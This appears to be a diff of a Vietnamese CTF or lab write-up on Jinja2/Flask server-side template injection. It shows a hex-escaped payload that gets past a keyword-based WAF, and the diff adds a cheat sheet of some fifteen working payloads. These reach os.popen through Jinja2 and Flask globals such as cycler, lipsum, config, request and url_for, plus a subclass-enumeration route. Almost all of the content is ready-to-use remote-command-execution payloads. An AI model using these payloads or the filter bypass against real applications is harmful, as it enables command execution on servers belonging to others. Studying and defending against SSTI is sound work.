@@ -54,7 +54,32 @@ Test thêm một lúc thì WAF dường như chỉ chặn ở tầng keyword. M�
 `{{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('o'+'s')|attr('po'+'pen')('<PAYLOAD>')|attr('read')()}}`
 
 Giải thích payload:
-- cycler: Class 
+- cycler: global trong Jinja2:
+```
+# === JINJA2 DEFAULT GLOBALS ===
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{range.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{dict.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# === FLASK INJECTED GLOBALS ===
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{session.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{g.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# === RUNTIME ===
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+
+# === SUBCLASSES (khi không có global nào dùng được) ===
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read()}}
+```
 
 ![[Pasted image 20261015180316.png]]
 
